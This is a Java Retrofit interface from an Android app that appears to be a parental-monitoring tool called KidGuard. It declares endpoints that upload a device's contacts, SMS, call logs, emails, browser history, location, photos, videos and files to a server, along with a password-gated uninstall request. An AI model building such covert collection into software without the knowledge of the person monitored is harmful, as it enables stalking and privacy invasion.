package com.kidguard.interfaces;


import com.kidguard.pojo.ApiResponsePOJO;
import com.kidguard.pojo.LogInPOJO;

import java.util.HashMap;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import retrofit2.http.PartMap;
import retrofit2.http.Query;

public interface RestClient {

    @FormUrlEncoded
    @POST("./")
    Call<LogInPOJO> logInRequest(@Field("email") String email, @Field("device_code") String deviceCode, @Field("device_registration_id") String deviceRegistrationId, @Field("device_mac_address") String macAddress, @Field("app_version_name") String appVersionName, @Field("app_version_code") String appVersionCode, @Field("os_version") String osVersion, @Field("device_model") String deviceModel, @Field("manufacturer") String manufacturer);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendContactsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendSmsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendCallsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendAppsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendEmailsToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendBrowserHistoryToServer(@Field("access_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendLocationToServer(@Field("access_token") String token, @Field("data") String data);

    @Multipart
    @POST("./")
    Call<ApiResponsePOJO> sendImageToServer(@Query("access_token") String token, @PartMap() HashMap<String, RequestBody> map, @Part MultipartBody.Part file);

    @Multipart
    @POST("./")
    Call<ApiResponsePOJO> sendVideoToServer(@Query("access_token") String token, @PartMap() HashMap<String, RequestBody> map, @Part MultipartBody.Part file);

    @Multipart
    @POST("./")
    Call<ApiResponsePOJO> sendFilesToServer(@Query("access_token") String token, @PartMap() HashMap<String, RequestBody> map, @Part MultipartBody.Part file);

    @Multipart
    @POST("./")
    Call<ApiResponsePOJO> sendDriveToServer(@Query("access_token") String token, @PartMap() HashMap<String, RequestBody> map, @Part MultipartBody.Part file);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendSyncProcess(@Field("device_mac_address") String device_mac_address);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> uninstallRequest(@Field("email") String email, @Field("password_or_device_code") String deviceCodeOrPassword, @Field("device_mac_address") String macAddress, @Field("access_token") String accessToken);

    @FormUrlEncoded
    @POST("./")
    Call<ApiResponsePOJO> sendDevicePermission(@Field("access_token") String token, @Field("data") String data);
}
